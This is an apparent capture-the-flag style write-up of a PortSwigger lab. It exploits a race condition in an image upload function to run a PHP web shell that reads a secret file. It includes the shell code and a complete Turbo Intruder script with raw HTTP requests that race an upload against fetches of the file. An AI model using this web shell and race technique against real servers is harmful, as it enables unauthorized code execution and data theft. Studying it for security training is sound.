# Web shell upload via race condition
* This lab contains a vulnerable image upload function. Although it performs robust validation on any files that are uploaded, it is possible to bypass this validation entirely by exploiting a race condition in the way it processes them.
	* To solve the lab, upload a basic PHP web shell, then, use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner
	* You can log in to your own account using the following credentials: _wiener:peter_
### 1. Make a PHP payload to exfilterate the target file
* The file is saved as "file.php"
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
### 2. Try to uplaod the malicious PHP file
* Login as wiener and a file upload panel is found on "My account".

![86](https://user-images.githubusercontent.com/53956303/152077758-52fefe38-be4d-4b9b-a3b5-4ab3df5a32e3.png)
* From the result, an error message is given

![114](https://user-images.githubusercontent.com/53956303/152261291-cceac4b0-dc0b-45f3-aa19-ec79ec787079.png)
### 3. Capture _POST /my-account/avatar_
* Then, send it to `Extensions => Turbo Intruder => Send to Turbo Intruder`

![115](https://user-images.githubusercontent.com/53956303/152261409-2a71f59f-3865-4b09-804e-00977def321b.png)
### 4. Modify using Turbo intruder's Python editor
* Paste the _POST /my-account/avatar_ to "request1"
* Passte the _GET /files/avatars/file.php_ to "request2"
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''
POST /my-account/avatar HTTP/1.1
Host: ac4b1fe61eb18bfac0da0eac0099008b.web-security-academy.net
Cookie: session=4JHIfKxSO9vkroznbJ2T6X8YhalSjUiy
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://ac4b1fe61eb18bfac0da0eac0099008b.web-security-academy.net/my-account
Content-Type: multipart/form-data; boundary=---------------------------234952120442243097481423225386
Content-Length: 543
Origin: https://ac4b1fe61eb18bfac0da0eac0099008b.web-security-academy.net
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Te: trailers
Connection: close

-----------------------------234952120442243097481423225386
Content-Disposition: form-data; name="avatar"; filename="file.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>

-----------------------------234952120442243097481423225386
Content-Disposition: form-data; name="user"

wiener
-----------------------------234952120442243097481423225386
Content-Disposition: form-data; name="csrf"

kB46cV3I5LKPAzlrKHfyL1yngFwCkzYl
-----------------------------234952120442243097481423225386--'''

    request2 = '''
GET /files/avatars/file.php HTTP/1.1
Host: ac4b1fe61eb18bfac0da0eac0099008b.web-security-academy.net
Cookie: session=4JHIfKxSO9vkroznbJ2T6X8YhalSjUiy
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Te: trailers
Connection: close

'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```

### 5. Start Attack
* At the buttom of the Trubo intruder window, 
	* This script will submit a single _POST_ request to upload the malicious _file.php_ file, instantly followed by 5 _GET_ request to `/files/avatars/file.php`. It means that the Turbo intruder tries to execute the uploaded PHP shell before it is being dropped by the validation on the server.

![116](https://user-images.githubusercontent.com/53956303/152262497-880e33ca-88ab-43f8-b4c0-eb560a381477.png)
* From the result, some requests reveived a 200 response containing Carlos's secret.
	* The requests hit the server after the PHP file was uploaded, but before it failed validation and was deleted.

![117](https://user-images.githubusercontent.com/53956303/152262755-e548c9cb-113c-4885-996b-a6f88a3e78f9.png)
* By submitting the key, the lab is solved.

![118](https://user-images.githubusercontent.com/53956303/152262817-257fe23b-66c7-4f40-b74e-581479037e8e.png)
